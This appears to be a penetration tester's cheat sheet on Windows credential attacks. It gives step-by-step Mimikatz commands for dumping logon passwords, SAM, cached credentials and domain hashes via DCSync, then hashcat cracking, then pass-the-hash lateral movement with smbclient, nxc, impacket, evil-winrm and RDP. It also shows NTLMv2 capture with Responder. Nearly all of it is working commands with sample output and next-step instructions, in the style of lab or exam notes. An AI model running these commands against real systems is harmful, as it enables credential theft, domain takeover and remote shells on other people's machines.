
# Mimikatz

## Check if Running as Administrator
```bash
# Mimikatz requires Administrator or SYSTEM privileges
whoami /groups
# Look for: BUILTIN\Administrators -> Enabled
```
## Privilege Escalation within Mimikatz
```bash
privilege::debug
# Example Result:
# Privilege '20' OK
# What to do next? Proceed to credential dumping commands below.

## Dump Logon Passwords (Plaintext + Hashes)
privilege::debug
sekurlsa::logonpasswords
# Example Result:
# Authentication Id : 0 ; 1234567
# Session           : Interactive from 1
# User Name         : Administrator
# Domain            : CORP
# NTLM              : 160c0b16dd0ee77e7c494e38252f7ddf
# SHA1              : 2b26e304f13c21b8feca7dcedb5bd480464f73b4
# What to do next? Copy NTLM hash and use for PtH attacks. See PtH section below.
```
## Dump SAM Hashes (Local Accounts)
```bash
privilege::debug
token::elevate
lsadump::sam
# Example Result:
# User : Administrator
# Hash NTLM: 7a38310ea6f0027ee955abed1762964b
# What to do next? Copy hash and crack with hashcat or use for PtH. See sections below.
```
## Dump Cached Domain Credentials (useful when DC is unreachable)
```bash
privilege::debug
token::elevate
lsadump::cache
# Example Result:
# * Username : j.smith
# * Domain   : CORP
# * Hash     : $DCC2$10240#j.smith#a3f1c2d4...
# What to do next? Crack with hashcat mode 2100:
hashcat -m 2100 cache.hash /usr/share/wordlists/rockyou.txt
```
## DCSync Attack (Pull all domain hashes as if you were a DC)
```bash
# NOTE: Requires Domain Admin or replication privileges
privilege::debug
lsadump::dcsync /domain:corp.local /all /csv
# Example Result:
# [DC] 'corp.local' will be the domain
# Administrator    160c0b16dd0ee77e7c494e38252f7ddf
# krbtgt           7a38310ea6f0027ee955abed1762964b
# j.smith          3ae8e5f0ffabb3a627672e1600f1ba10
# What to do next? Save the krbtgt hash for Golden Ticket attacks. See Kerberos section.
# Use Administrator hash for PtH attacks. See PtH section below.

# DCSync for a specific user only
lsadump::dcsync /domain:corp.local /user:Administrator
# Example Result:
# * Username : Administrator
# * NTLM     : 160c0b16dd0ee77e7c494e38252f7ddf
# What to do next? Use hash for PtH attacks.
```
## Identify Hash Type
```bash
hashid '<hash>'
# Example:
hashid '3ae8e5f0ffabb3a627672e1600f1ba10'
# Example Result:
# [+] NTLM
# [+] MD4
# What to do next? Use the hash type to select the correct hashcat mode below.

## Crack NTLM Hash with Hashcat
# Save hash to file first
echo '3ae8e5f0ffabb3a627672e1600f1ba10' > hash.txt
# Crack it
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best66.rule --force
# Example Result:
# 3ae8e5f0ffabb3a627672e1600f1ba10:nicole1
# What to do next? Use plaintext password to authenticate via RDP, WinRM, SMB etc.
```
## Pass-the-Hash (PtH) Attacks
```bash
# smbclient - Good for file enumeration
smbclient \\\\<target-ip>\\<share> -U <domain>/<username> --pw-nt-hash <hash>
# Example:
smbclient \\\\192.168.102.227\\secrets -U MARKETINGWK02/Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b

# NXC/CrackMapExec - Best for validation and spraying
nxc smb <target-ip> -u <username> -H <hash> --local-auth
# Example:
nxc smb 192.168.102.227 -u Administrator -H 7a38310ea6f0027ee955abed1762964b --local-auth
# Execute a command via PtH
nxc smb 192.168.102.227 -u Administrator -H 7a38310ea6f0027ee955abed1762964b --local-auth -x "whoami"
# Dump SAM via PtH
nxc smb 192.168.102.227 -u Administrator -H 7a38310ea6f0027ee955abed1762964b --local-auth --sam

# Impacket psexec - Noisy, drops binary on disk
/home/kali/impacket-latest/examples/psexec.py <domain>/<username>@<target-ip> -hashes :<hash>

# Impacket wmiexec - Stealthier, no binary dropped
/home/kali/impacket-latest/examples/wmiexec.py Administrator@192.168.102.227 -hashes :7a38310ea6f0027ee955abed1762964b
# With domain:
/home/kali/impacket-latest/examples/wmiexec.py MARKETINGWK02/Administrator@192.168.102.227 -hashes :7a38310ea6f0027ee955abed1762964b
# With debug flag:
impacket-wmiexec -debug -hashes 00000000000000000000000000000000:160c0b16dd0ee77e7c494e38252f7ddf CORP/Administrator@192.168.50.248
# Example Result:
# C:\> whoami
# corp\administrator
# What to do next? You have a remote shell. Proceed to post exploitation.

# RDP - Needs Restricted Admin Mode enabled on target
xfreerdp3 /v:<target-ip> /u:<username> /pth:<hash> /cert:ignore +clipboard +fonts +compression /dynamic-resolution /drive:tools,/home/kali/tools
# Example:
xfreerdp3 /v:192.168.102.227 /u:Administrator /pth:7a38310ea6f0027ee955abed1762964b /cert:ignore +clipboard +fonts +compression /dynamic-resolution /drive:tools,/home/kali/tools
# NOTE: If RDP PtH fails, enable Restricted Admin Mode via registry (requires code execution):
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f

# WinRM - Clean PowerShell interface
evil-winrm -i <target-ip> -u <username> -H <hash>
# Example:
evil-winrm -i 192.168.102.227 -u Administrator -H 7a38310ea6f0027ee955abed1762964b

# Mimikatz lateral movement from a Windows host
# Spawn a cmd shell
sekurlsa::pth /user:Administrator /domain:MARKETINGWK02 /ntlm:7a38310ea6f0027ee955abed1762964b /run:cmd.exe
# Spawn PowerShell
sekurlsa::pth /user:Administrator /domain:MARKETINGWK02 /ntlm:7a38310ea6f0027ee955abed1762964b /run:powershell.exe
# Example Result:
# A new process is spawned with the injected hash
# What to do next? Use the new window to access network resources as the target user.
```

## NTLMv2 Capture via Responder (Non-Privileged User)
```bash
# Step 1: Find your interface
ip a
# Look for tun0 and note your IP

# Step 2: Start Responder on Kali
sudo responder -I tun0

# Step 3: On target machine - trigger authentication to your Responder listener
dir \\192.168.45.161\test
# Example Result:
# Responder captures:
# [SMB] NTLMv2 Hash: paul::FILES01:1f9d4c51f6e74653:795F138EC69C274D0FD53BB32908A72B:0101...
# What to do next? Save the hash and crack it:
echo 'paul::FILES01:1f9d4c51f6e74653:795F138...' > paul.hash
hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force
# Example Result:
# paul::FILES01:...:123Password123
# What to do next? Use plaintext to authenticate via RDP, WinRM, SMB etc.
```
## Windows Credential Guard (Domain Account)
```bash
# RDP with password
xfreerdp3 /v:TARGET_IP /u:USERNAME /d:DOMAIN /p:'PASSWORD' /cert:ignore +clipboard +fonts +compression /dynamic-resolution /drive:tools,/home/kali/tools
# Example:
xfreerdp3 /v:192.168.160.248 /u:Administrator /d:CORP /p:'QWERTY123!@#' /cert:ignore +clipboard +fonts +compression /dynamic-resolution /drive:tools,/home/kali/tools

# RDP with hash
xfreerdp3 /v:TARGET_IP /u:USERNAME /d:DOMAIN /pth:'HASH' /cert:ignore +clipboard +fonts +compression /dynamic-resolution /drive:tools,/home/kali/tools

# Once inside run Mimikatz as Administrator to get hash
privilege::debug
sekurlsa::logonpasswords
# Example Result:
# * Username : Administrator
# * Domain   : CORP
# * NTLM     : 160c0b16dd0ee77e7c494e38252f7ddf
# * SHA1     : 2b26e304f13c21b8feca7dcedb5bd480464f73b4
# What to do next? Use NTLM hash for PtH attacks or DCSync. See sections above.

## NOTE: Golden Ticket and Kerberos attacks using the krbtgt hash -> See Kerberos section of notes.
```